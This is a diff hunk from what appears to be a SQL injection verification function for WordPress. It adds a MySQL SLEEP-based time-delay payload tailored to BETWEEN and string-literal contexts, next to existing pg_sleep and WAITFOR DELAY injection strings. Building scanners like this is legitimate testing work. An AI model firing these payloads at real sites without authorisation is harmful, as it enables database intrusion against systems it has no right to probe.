@@ -3284,6 +3284,9 @@ def verify_wordpress_sqli(
             (f"{orig_value} AND pg_sleep(5)-- -", f"{orig_value} AND pg_sleep(0)-- -"),
             (f"{orig_value}';WAITFOR DELAY '0:0:5'--", f"{orig_value}';WAITFOR DELAY '0:0:0'--"),
             (f"{orig_value});WAITFOR DELAY '0:0:5'--", f"{orig_value});WAITFOR DELAY '0:0:0'--"),
+            # BETWEEN-context: avoids '--' that breaks unclosed string literals inside SQL functions.
+            # Works in: BETWEEN '$from X' AND '$to Y', DATE('$from'), and standard WHERE '$col'.
+            (f"1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1", f"1' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a) AND '1"),
         ]
         timing_tried = []
         timing_consistent = 0
